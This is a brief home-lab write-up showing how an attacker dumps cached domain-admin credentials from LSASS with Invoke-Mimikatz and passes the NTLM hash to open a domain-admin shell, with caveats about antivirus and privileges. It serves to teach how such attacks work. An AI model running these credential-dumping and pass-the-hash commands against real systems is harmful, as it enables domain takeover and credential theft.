# Dumping Domain Admin Hash and Passing The Hash

This lab will demonstrate how a threat actor may be able to dump Domain Admin hashes from a compromised system. Defender is turned off. 


Scenario: Bad guy compromised the user dchrute's computer and is able to escalate privileges. Earlier in the day, jhalpert, a domain admin was logged into dchrute's computer for maintenance. 

## Dump LSASS memory with Invoke-Mimikatz.ps1 

Invoke-Mimikatz -dumpcreds

![image](https://user-images.githubusercontent.com/90155329/132380262-b8b560e0-76c6-4e4b-935c-374815389a93.png)

Now, with the hash I can use mimikatz pass it and spawn a shell with Domain Admin privileges

Invoke-mimikatz -Command '"sekurlsa::pth /ntlm:9e7c6b33d9a2dfc1c9aef53eb2837b32 /user:jhalpert /domain:DUNDER-MIFFLIN /run:powershell.exe "'

![image](https://user-images.githubusercontent.com/90155329/132380295-992c502a-2214-4553-9d25-fc9eacd33f04.png)

I was able to list the C$ share on the domain controller which means admin privileges.

![image](https://user-images.githubusercontent.com/90155329/132380335-a3799e34-57a2-4957-a72a-66367fe7bce9.png)``

## Caveats
- Windows Defender was turned off. For this to work, mimikatz would need to be modified to avoid AV
- dschrute had local admin privileges on his machine. This makes it easy to dump credentials. In a real world scenario, the after gaining a foot hold the adversary must first escalate privileges. 
- If Jhalpert did not login to dschrutes machine earlier, the actor would not be able to dump the necessary credentials. 
